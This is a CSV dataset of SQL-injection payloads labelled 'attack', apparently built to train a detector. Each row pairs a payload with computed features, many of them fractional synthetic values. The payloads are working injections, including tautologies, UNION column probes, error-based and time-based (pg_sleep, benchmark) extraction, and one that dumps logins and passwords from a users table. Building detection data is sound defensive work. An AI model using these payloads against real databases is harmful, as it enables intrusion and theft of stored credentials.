id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000792,attack,boolean,"1   )    )    as jrzr where 5194  =  5194 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R001731,0.00020123091275686152,273.99416114926356,39.99883222985271,3.799624901950106,82.99766445970542,35.0,111.99688594627389,43.99961074328424,0.30291751946806095,0.12774010596307775,0.40875631570838894,0.1605860588604724,0.0,0.0,2.0,0.0,0.0,2.0,0.0,23.999610743284236,0.0,2.0,4.0,14.0,0.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
SMOTE_000793,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R001987,0.14077538906272152,258.7886014433832,36.1578583934743,3.773383323574896,82.0,29.0,103.15716786948602,44.631433573897205,0.3172019773932473,0.11218118712688012,0.398147693616988,0.1724691418628846,4.0,0.0,0.0,0.0,0.0,2.0,0.0,22.6314335738972,0.0,2.0,4.0,12.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
SMOTE_000794,attack,boolean,"1'   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R002704,0.31018467000768446,141.51442018338565,31.085736697230942,3.9890623942057895,68.80007844030831,8.542868348615473,46.08573669723094,18.085736697230946,0.4859951261033788,0.06032612071534407,0.3259473694065922,0.12773138377468485,1.0,0.0,2.0,0.0,1.0,1.0,0.0,7.0,0.0,0.0,2.5428683486154724,4.0,1.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000795,attack,boolean,1   )    )     )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  5368  =  5368,nearest_attack_euclidean,R002618,0.2588677841277454,380.3946098858288,33.0493262357286,3.4619958222373697,93.36621749048572,53.0,172.2959574143716,61.73243498097146,0.24558881172142685,0.13945200574976685,0.4526777990618178,0.16228138346698848,0.0,0.0,0.0,0.0,0.0,3.0,0.0,34.73243498097146,0.0,3.0,0.0,23.0,0.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000796,attack,boolean,admin'  )   or '1'  =  '1,nearest_attack_euclidean,R000471,1.2641268274459592,29.468574410418498,11.593765962689227,2.866161586180644,9.84363826117541,1.1875319253784546,12.437404223864633,6.0,0.3242343729516175,0.04750127701513818,0.41805484610270105,0.2102095039305433,3.5937659626892273,0.0,0.0,0.0,0.0,1.0,0.0,1.4062340373107727,0.0,0.0,0.0,0.9999999999999996,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.40623403731077296,0.593765962689227,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000797,attack,boolean,"1'||  (  select 'xyrk' from dual where 9844  =  9844 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R005733,0.4649843330445476,189.1542983323639,37.38971344450907,4.339303294357045,102.52686751772143,17.610286555490926,47.22057311098185,21.79657114816969,0.5397574768300071,0.09331428415649828,0.2505828502885924,0.11634538872490219,3.0,0.0,2.0,0.0,1.0,2.0,0.0,5.0,0.0,0.0,3.6102865554909265,7.0,1.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,2.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000798,attack,boolean,"1'  )   where 1363  =  1363 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R002662,0.11280552035316016,202.2900806412272,33.56997311959093,3.7799983705965565,57.0,33.290080641227206,80.0,32.0,0.2817887377682677,0.1645211108274168,0.3954929652887968,0.1581971861155187,1.0,0.0,2.0,0.0,0.0,2.0,0.0,17.0,0.0,1.0,3.0,10.0,1.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000799,attack,boolean,"-6519'   )    )    as tdlt where 5040  =  5040 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R001205,0.3495231204740984,390.61294729761096,31.870982432536987,3.4152771753083506,102.12901756746301,57.61294729761096,177.0,53.87098243253699,0.2614623173762868,0.14748801282796195,0.45313700219054276,0.13791266760520848,1.0,0.0,2.8709824325369877,0.0,0.0,3.0,0.0,36.0,0.0,0.0,1.0,15.870982432536987,1.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,1.0,0.0,0.1290175674630124,0.8709824325369875,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,18.999999999999996
SMOTE_000800,attack,boolean,"1""  )   rlike   (  select   (  case when   (  5746  =  5367  )   then 1 else 0x28 end   )    )    and   (  ""hnnf"" like ""hnnf",nearest_attack_euclidean,R003276,0.44400523585295926,119.46728196249816,28.43341024531227,3.5386450760492236,43.87528841992101,13.0,50.30023073593681,12.291762806640339,0.3661501397085633,0.11000397392071565,0.4215401428126105,0.10230574355811062,0.0,3.5750576839842028,0.0,0.0,0.0,1.0,0.0,7.716705122656135,0.0,0.0,0.0,0.9999999999999996,0.0,1.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,1.0,0.0,0.0,0.0,0.8583525613280676,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,3.8583525613280676
SMOTE_000801,attack,boolean,-5134   )    )     )   or 8571  =  8571--,nearest_attack_euclidean,R002475,0.06293113968116355,41.0,12.327826140306996,2.709869376091574,2.0,12.0,20.0,7.0,0.04878048780487804,0.2926829268292683,0.4878048780487805,0.17073170731707318,0.0,0.0,3.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,4.0,0.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000802,attack,union,"-5509%""   )    )     )   union all select 7066,7066,7066,7066,7066,7066,7066,7066,7066,7066--",nearest_attack_euclidean,R002456,0.3312390017637193,89.67801057035676,21.664397885928647,3.6266015526357873,14.0,42.671204228142706,16.671204228142702,16.335602114071353,0.1565627480262994,0.4760447633270598,0.18528537413536078,0.1821071145112801,0.0,1.0,3.0,0.0,0.0,0.0,0.0,2.6678010570356756,0.9999999999999999,0.0,8.667801057035676,3.0,0.0,1.0,1.0,0.0,2.168404344971009e-19,0.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000803,attack,error,"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'qcsi'  =  'qcsi",nearest_attack_euclidean,R003386,0.0042297469372600364,161.07857660293425,27.992142339706575,3.8740959333057203,45.0,39.0,55.062861282347406,22.01571532058685,0.27937467047575304,0.24212471441231936,0.34182554041976493,0.13667507469216264,4.0,0.0,0.0,0.0,0.0,2.0,0.0,10.015715320586851,0.0,0.0,6.0,2.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000804,attack,error,"1 where 5266  =  5266 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R008459,0.07917266248256954,192.03761454326286,32.0,3.671654510947782,49.0,40.0,79.0,24.037614543262848,0.25515859475874675,0.2082927304153035,0.41137814257022437,0.12517053225572536,0.0376145432628483,0.0,2.0,0.0,1.0,2.0,0.0,14.0,0.0,0.0,4.0,5.0,0.03761454326284819,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000805,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  ""woun"" like ""woun",nearest_attack_euclidean,R007886,0.38635115243210183,135.59917416228873,28.199724720762912,4.0728269961190735,80.8495182613351,3.549931180190727,36.09986236038146,15.099862360381456,0.5962643050863705,0.02606760128416835,0.2664198773329541,0.11124821629650698,0.0,3.0,0.0,0.0,1.0,0.0,0.0,5.0,0.0,0.0,2.549931180190728,0.9999999999999996,0.0,1.0,0.0,0.0,2.168404344971009e-19,0.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000806,attack,boolean,"1%""   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R008285,0.0014034930322681036,142.99052992922427,32.9962119716897,4.148954326548863,72.0,8.998105985844854,42.9962119716897,18.996211971689704,0.5035310552901517,0.06292765717101427,0.3006924863177756,0.1328488012210584,0.0,1.0,2.0,0.0,1.0,1.0,0.0,6.0,0.9999999999999999,0.0,2.9981059858448518,4.0,0.0,1.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000807,attack,union,"1"" union all select null,null,null,null#",nearest_attack_euclidean,R002810,0.77474778667083,40.40319982967971,15.403199829679702,3.357740974979463,30.0,1.0,4.0,5.403199829679702,0.7426243933595176,0.02475414644531726,0.09901658578126904,0.13360487441389607,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.4031998296797019,0.0,3.0,0.0,0.0,1.0,0.0,1.0000000000000002,2.168404344971009e-19,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000808,attack,boolean,1'+  (  select 'rpds' where 5870  =  5870 and 4595  =  4595#,nearest_attack_euclidean,R005636,0.24054508513417294,59.661855833342415,25.338144166657585,3.98227362649873,18.0,17.0,17.0,7.661855833342415,0.30174902155167715,0.28498518702102843,0.28498518702102843,0.12828060440626596,2.661855833342414,0.0,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,3.0,1.0,0.0,0.0,1.0000000000000002,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000809,attack,time,"1%""  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  ""%""  =  """,nearest_attack_euclidean,R002077,0.14526914727551485,91.56489546938235,25.0,3.3215970913286963,23.0,10.0,43.13741289115195,15.427482578230391,0.2525611419115249,0.10980919213544561,0.4691328460841053,0.1684968198689241,0.0,4.0,0.0,0.0,0.0,2.0,0.0,6.427482578230391,2.0,1.0,0.0,2.0,0.0,1.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000810,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  ""poik""  =  ""poik",nearest_attack_euclidean,R007125,0.3124065787034525,83.11676053897729,28.686126756496215,3.925142517599004,29.74450702598486,15.0,28.37225351299243,10.0,0.3569159581789552,0.18102314132398722,0.3413788062810661,0.12068209421599146,0.0,3.0,0.0,0.0,0.0,1.0,0.0,4.843063378248107,0.1569366217518926,0.0,1.0,0.9999999999999996,0.0,1.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000811,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R006849,0.02028712459999,80.205471490017,23.0410942980034,3.686579145479179,47.16437719201361,9.0,14.0,10.041094298003403,0.5880136787250425,0.11222805243968337,0.17457697046172965,0.12518129837354441,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,6.041094298003403,0.9999999999999996,1.0,0.0,0.0,1.0000000000000002,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000812,attack,other,", begin declare @var varchar  (  8000  )   set @var  =  ':' select @var  =  @var+'+login+'/'+password+' ' from users where login >",nearest_attack_euclidean,R000458,1.4424953227669217,136.0395707894476,35.0131902631492,4.188192692514732,63.27617552635348,10.375102499972462,39.05935618417139,23.328936578950266,0.4723000894795075,0.0725886196381824,0.2825638867078406,0.17254740417446948,6.664468289475133,0.0,0.0,1.0,0.0,2.0,0.0,4.68425368419893,0.0,0.0,1.0,7.657873157900534,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,1.0,0.6644682894751336,0.0,0.3355317105248664,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000813,attack,union," select * from users where id  =  1 +$+. union select null,@@VERSION -- 1",nearest_attack_euclidean,R000488,0.12508208354733466,73.0,31.795631655781868,4.392677103271081,44.0,2.204368344218132,16.20436834421813,10.591263311563738,0.6027397260273972,0.03019682663312509,0.2219776485509333,0.14508579878854433,0.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,5.795631655781869,0.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000814,attack,other,-9509'  )   where 9303  =  9303 order by 1#,nearest_attack_euclidean,R006575,0.08833621160666538,43.557191323455996,19.417893492591997,3.6269515872546076,12.417893492592,13.0,13.139297830863995,5.0,0.284214830962145,0.2990225776539316,0.30175390767087273,0.11500868371305062,1.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,1.0000000000000002,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.9999999999999999,0.0,0.0,0.0,3.0
SMOTE_000815,attack,boolean,1  )   and 2006  =  2006,nearest_attack_euclidean,R005698,0.5041927038177986,24.92307083179071,10.461535415895353,2.8210146061096006,4.384606247686058,8.538464584104648,10.0,2.0,0.17381624591200842,0.3439351162378128,0.401873864875149,0.08037477297502979,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.9999999999999996,0.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000816,attack,union,"-2417  )   union all select 2169,2169,2169,2169,2169,2169,2169,2169,2169,2169#",nearest_attack_euclidean,R002816,0.18867488369937183,79.86948888996227,21.26706984142318,3.679618167419028,14.0,44.0,9.60241904853909,12.267069841423181,0.17553954080550954,0.5516956996744586,0.11916029783806192,0.15360446168196998,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.2670698414231811,0.0,0.0,9.0,0.9999999999999996,0.0,0.0,0.0,1.0000000000000002,2.168404344971009e-19,0.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000817,attack,boolean,-4498  )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  2902  =  2902,nearest_attack_euclidean,R003561,0.0888311596583136,365.78471299268153,36.0,3.612959449075212,92.87428065441533,55.66474841177423,157.37140327207666,59.87428065441533,0.2539451710804947,0.15214532302154823,0.4302058941683605,0.16370361172959655,0.0,0.0,1.0,0.0,0.0,2.9580935514717765,0.0,31.916187102943553,0.0,3.0,0.0,23.958093551471777,0.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,1.0,0.0,0.0,1.0,0.9580935514717768,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.9580935514717765
SMOTE_000818,attack,boolean,and 1 in   (  select var from temp  )  --,nearest_attack_euclidean,R000138,0.34152351247368895,41.101343990028795,19.49328004985603,3.604226149224102,22.0,1.0,14.0,4.101343990028793,0.5352906110449284,0.024331391411133108,0.3406394797558635,0.09973851778807513,0.0,0.0,2.0,0.0,0.0,0.0,0.0,1.9999999999999991,0.0,0.0,0.10134399002879424,2.0,0.0,0.0,1.0,0.0,2.168404344971009e-19,0.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.10134399002879413,0.0,0.898656009971206,0.8986560099712059,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.898656009971206
SMOTE_000819,attack,boolean,"1  )   where 8474  =  8474 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",nearest_attack_euclidean,R007650,0.011727582350283112,198.37729937542093,30.05030658338946,3.6418076405692146,113.15091975016838,20.0,49.20122633355784,16.025153291694732,0.5704046872744053,0.100831175902015,0.24798110553063085,0.08078303129294878,0.0,0.0,2.0,0.0,1.0,2.0,0.0,5.02515329169473,0.0,0.0,6.0,5.0,0.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000820,attack,boolean,"1""  )   as ubva where 6369  =  6369 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R005299,0.06921755272847632,152.24872099572212,35.0,4.22816750426744,76.0,16.0,44.07033228204752,16.178388713674586,0.499333439698429,0.10512282941019559,0.2892918589895685,0.1062518719018069,0.0,1.0,2.0,0.0,1.0,2.0,0.0,5.178388713674586,0.0,0.0,2.0,5.0,0.0,1.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
